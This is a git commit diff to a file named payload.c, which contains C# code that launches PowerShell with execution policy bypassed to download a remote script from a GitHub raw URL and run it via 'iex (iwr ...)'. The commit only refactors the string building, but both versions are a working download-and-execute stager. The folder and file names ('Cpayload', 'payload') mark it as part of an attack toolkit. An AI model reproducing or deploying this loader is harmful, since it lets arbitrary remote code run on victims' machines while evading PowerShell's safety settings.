d1a48b65fa8182955df9c36caf5eeb5cdfa1f168
43a1723 <hai1723notgay@gmail.com>
2024-09-02 15:38:46 +0700

    Update payload.c

--- Extras/Cpayload/payload.c
+++ Extras/Cpayload/payload.c
@@ -8,12 +8,12 @@ namespace PowerShellExecution
         static void Main()
         {
             string url = "https://raw.githubusercontent.com/43a1723/test/main/Extras/Cpayload/main.ps1";
-            string psCommand = $"iex (iwr {url} -UseBasicP)";
+            string psCommand = "iex (iwr " + url + " -UseBasicP)";
 
             ProcessStartInfo startInfo = new ProcessStartInfo
             {
                 FileName = "powershell.exe",
-                Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{psCommand}\"",
+                Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \"" + psCommand + "\"",
                 RedirectStandardOutput = true,
                 RedirectStandardError = true,
                 UseShellExecute = false,
@@ -22,7 +22,6 @@ namespace PowerShellExecution
 
             using (Process process = Process.Start(startInfo))
             {
-                // Output and error streams can be captured if needed
                 string output = process.StandardOutput.ReadToEnd();
                 string error = process.StandardError.ReadToEnd();
                 process.WaitForExit();
